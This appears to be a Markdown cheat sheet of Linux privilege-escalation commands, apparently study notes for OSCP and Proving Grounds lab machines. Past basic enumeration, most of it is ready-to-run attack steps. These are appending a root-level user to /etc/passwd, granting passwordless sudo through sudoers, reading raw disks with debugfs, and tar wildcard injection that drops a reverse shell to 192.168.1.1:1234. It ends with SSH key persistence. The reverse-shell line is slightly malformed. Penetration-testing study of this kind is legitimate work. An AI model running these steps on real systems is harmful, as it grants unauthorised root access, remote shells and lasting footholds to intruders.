## System info

```cat /etc/issue```

```cat /etc/os-release```

```arch```

### Uname

All

```Uname -a```

Kernel version

```Uname -r```

## Processes

```ps aux```

## Network

**IP and interfaces**

```ifconfig```

```ip a```

**Routing table**

```routel```

**Active connections**

```netstat```

```ss```

## CRON - Scheduled tasks

List all cron jobs 

```ls -lah /etc/cron*```

Display current user's jobs

```crontab -l```

Display sudo jobs

```sudo crontab -l```

Get CRON logs

```cat /var/log/cron.log```

```grep "CRON" /var/log/syslog```

## SetUID

SUID

```find / -perm -u=s -type f 2>/dev/null```

Capabilities

```/usr/sbin/getcap -r 2>/dev/null```

## User trails

```env```

```cat .bashrc```

## Writable

Writable config files, if a service config file is writable, can be used to privesc

```
find /etc -writable -type f 2>/dev/null
```

Writable directories

```
find / -writable -type d 2>/dev/null
```

### /etc/passwd

If writable, can make root account

```ls -lah /etc/passwd```

```
openssl passwd password123!

echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2
```

## sudo - superuser stuff

```sudo -l```

Add user to sudoers
```
echo '<user> ALL=(ALL:ALL) NOPASSWD:ALL' > /etc/sudoers.d/<user>

chmod 440 /etc/sudoers.d/<user>

echo '<user> ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
```

## Disk group

If a user is in disk group, there may be a chance to read sensitive files and prives

Check:
```
$id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)

$groups
dora disk
```

Find filesystem mounted on /
```
df -h
```

Access filesystem
```
debugfs <filesystem>
```

boxes: Extplorer (PG practice)

## Wildcard Injection

If there is a scheduled task such as:
```
tar -cf /opt/backup *
```
Wildcard injection is possible. This commands purpose is to archive all files in current directory with wildcard operator (*).

However, if a file is named "--checkpoint=1" or other tar options, it will be intepreted as an option rather than a file. Thus, we are able to run arbitrary commands with specifically crafted files.

```
# option files
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'

# executable script (can be any command)
echo -e "#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.1.1/1234 0>&1' > pwn.sh
```

Boxes: PG Linux (Readys), OSCP C (Charlie)

## Persistence

```
mkdir -p /home/<user>/.ssh
echo 'YOUR_PUBLIC_KEY_HERE' >> /home/<user>/.ssh/authorized_keys
chown -R <user>:<user> /home/<user>/.ssh
chmod 700 /home/<user>/.ssh
chmod 600 /home/<user>/.ssh/authorized_keys
```